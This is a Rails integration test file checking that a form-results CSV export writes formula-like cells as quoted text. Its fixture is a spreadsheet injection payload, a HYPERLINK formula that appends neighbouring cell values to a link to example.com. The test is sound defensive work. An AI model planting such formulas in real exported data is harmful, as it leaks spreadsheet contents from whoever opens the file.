require "test_helper"
require "csv"
require_relative "../support/forms_world"
require_relative "../support/settings_test_helper"

# Spreadsheets treat a cell starting with =, +, -, @, a tab or a carriage
# return as a formula. The results CSV writes such cells as text.
class FormResultsCsvTest < ActionDispatch::IntegrationTest
  include Devise::Test::IntegrationHelpers
  include FormsWorld
  include SettingsTestHelper

  FORMULA = %(=HYPERLINK("https://example.com/?d="&A3&B3,"Open"))

  setup do
    host! "localhost"
    build_person_fields_world
  end

  test "cells that would start a formula are written as text" do
    with_settings(feature_forms: "true") do
      form = create_world_form("T-shirt order", respond: "self_and_leaders")
      name = form.form_questions.create!(kind: :input, label: "Name to print", data_type: :string)
      size = form.form_questions.create!(kind: :input, label: "Size", data_type: :string)
      respond(form, :a1, as: :a1, answers: { name.key => FORMULA, size.key => "-1" })
      person(:a1).update!(last_name: "+World")

      sign_in person(:pack_leader).user
      get results_form_path(form, format: :csv)
      assert_response :success

      cells = CSV.parse(response.body).flatten.compact
      assert_empty cells.select { |cell| cell.start_with?("=", "+", "-", "@", "\t", "\r") }
      row = CSV.parse(response.body).detect { |line| line[1] == "A1" }
      assert_equal [ "'+World", "'#{FORMULA}", "'-1" ], [ row[0], row[-2], row[-1] ]
    end
  end

  test "ordinary answers are written as typed" do
    with_settings(feature_forms: "true") do
      form = create_world_form("T-shirt order", respond: "self_and_leaders")
      name = form.form_questions.create!(kind: :input, label: "Name to print", data_type: :string)
      respond(form, :a1, as: :a1, answers: { name.key => "A. World" })

      sign_in person(:pack_leader).user
      get results_form_path(form, format: :csv)
      row = CSV.parse(response.body).detect { |line| line[1] == "A1" }
      assert_equal [ "World", "A1", "Complete", "1" ], row.first(4)
      assert_equal "A. World", row.last
    end
  end
end
